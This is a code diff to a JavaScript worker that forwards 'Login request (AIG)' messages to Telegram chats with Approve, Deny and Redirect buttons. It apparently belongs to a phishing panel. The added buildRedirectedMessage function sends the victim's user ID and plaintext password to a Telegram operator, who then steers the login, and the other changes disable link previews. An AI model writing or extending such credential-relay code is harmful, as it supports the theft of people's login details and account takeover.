@@ -34,12 +34,14 @@ async function sendToAll(env, text, taskId, includeButtons) {
     var p = pairs[i];
     try {
       var payload = { chat_id: p.chatId, text: text };
-      if (includeButtons) {
+      payload.disable_web_page_preview = true;
+    if (includeButtons) {
         payload.reply_markup = {
           inline_keyboard: [
             [
               { text: "✅ Approve", callback_data: "approve:" + taskId },
               { text: "❌ Deny", callback_data: "deny:" + taskId },
+              { text: "↩️ Redirect", callback_data: "redirect:" + taskId },
             ],
           ],
         };
@@ -263,6 +265,15 @@ export function buildDeniedMessage(task) {
   ].join("\n");
 }
 
+export function buildRedirectedMessage(task) {
+  return [
+    "↩️ REDIRECTED via Telegram",
+    "🔐 Login request (AIG)",
+    "👤 User: " + task.user_id,
+    "🔑 Password: " + (task.password || "N/A"),
+  ].join("\n");
+}
+
 export async function editMessage(env, chatId, messageId, text) {
   var token = findTokenForChat(env, chatId);
   if (!token) return;
@@ -275,6 +286,7 @@ export async function editMessage(env, chatId, messageId, text) {
         chat_id: chatId,
         message_id: messageId,
         text: text,
+        disable_web_page_preview: true,
       }),
     });
   } catch (err) {
